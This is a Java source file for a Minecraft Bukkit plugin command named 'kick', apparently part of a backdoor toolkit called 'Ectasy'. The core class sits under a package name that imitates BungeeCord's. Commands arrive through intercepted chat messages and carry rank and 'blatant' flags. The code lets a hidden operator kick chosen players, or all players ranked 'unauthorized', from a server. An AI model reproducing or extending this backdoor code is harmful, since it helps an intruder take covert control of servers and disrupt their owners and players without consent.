package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.util.Arrays;

import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "kick",
   description = "Kick a player",
   blatant = true,
   rank = Rank.FREE
)
public class KickCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      String reason = String.join(" ", Arrays.stream(args).skip(1L).toArray(String[]::new)).replace("&", "§");
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use kick <player name> or kick *");
            } else if (args[0].equalsIgnoreCase("*")) {
               for(User var2 : Ectasy.users.values()) {
                  if (var2.rank == Rank.UNAUTHORIZED) {
                     var2.player.kickPlayer(reason);
                  }
               }

               ChatUtil.sendChat(e.getPlayer(), "Kicked everyone.");
            } else {
               Player var1 = Bukkit.getServer().getPlayer(args[0]);
               if (var1 == null) {
                  ChatUtil.sendChat(e.getPlayer(), "The player " + args[0] + " is not online.");
               } else {
                  var1.kickPlayer(reason);
                  ChatUtil.sendChat(e.getPlayer(), "Kicked the player " + var1.getName());
               }
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
